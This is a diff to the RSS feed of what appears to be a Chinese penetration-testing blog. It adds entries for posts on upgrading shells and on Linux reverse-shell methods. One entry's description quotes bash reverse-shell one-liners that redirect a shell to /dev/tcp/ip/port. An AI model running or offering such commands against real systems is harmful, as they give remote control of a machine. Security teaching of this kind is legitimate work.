@@ -9,7 +9,16 @@
     <managingEditor>al0sc0605@gmail.com (wyunan)</managingEditor>
     <webMaster>al0sc0605@gmail.com (wyunan)</webMaster>
     <copyright>© 2021 &lt;a href=&#34;https://github.com/wyunan&#34;&gt;wyunan&lt;/a&gt;</copyright>
-    <lastBuildDate>Thu, 18 Aug 2022 22:34:46 +0800</lastBuildDate><atom:link href="https://wyunan.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 21 Sep 2022 22:05:28 +0800</lastBuildDate><atom:link href="https://wyunan.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Linux的shell升级方法</title>
+      <link>https://wyunan.github.io/posts/202209212205/</link>
+      <pubDate>Wed, 21 Sep 2022 22:05:28 +0800</pubDate>
+      <author>al0sc0605@gmail.com (wyunan)</author>
+      <guid>https://wyunan.github.io/posts/202209212205/</guid>
+      <description>0x00. 前言 每个pentester都知道，当用netcat反弹一个反向shell并且看到详细的netcat消息跟输出时，这种感觉爽歪歪。 当然他们也</description>
+    </item>
+    
     <item>
       <title>Rsync介绍</title>
       <link>https://wyunan.github.io/posts/202208182234/</link>
@@ -35,6 +44,15 @@
       <author>al0sc0605@gmail.com (wyunan)</author>
       <guid>https://wyunan.github.io/posts/202203102037/</guid>
       <description>产品介绍 Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。 漏洞介绍 当启用和暴露 Gateway Actuator 端点时，使用</description>
+    </item>
+    
+    <item>
+      <title>Linux反弹shell方法</title>
+      <link>https://wyunan.github.io/posts/202110212158/</link>
+      <pubDate>Thu, 21 Oct 2021 21:58:40 +0800</pubDate>
+      <author>al0sc0605@gmail.com (wyunan)</author>
+      <guid>https://wyunan.github.io/posts/202110212158/</guid>
+      <description>0x01. bash 反弹 shell（最普通） 最普通的反弹shell方法。 将标准输入重定向到标准输出 bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1 将标准输入重定向到标准错误输出 bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;2 0x02. python 反弹</description>
     </item>
     
     <item>
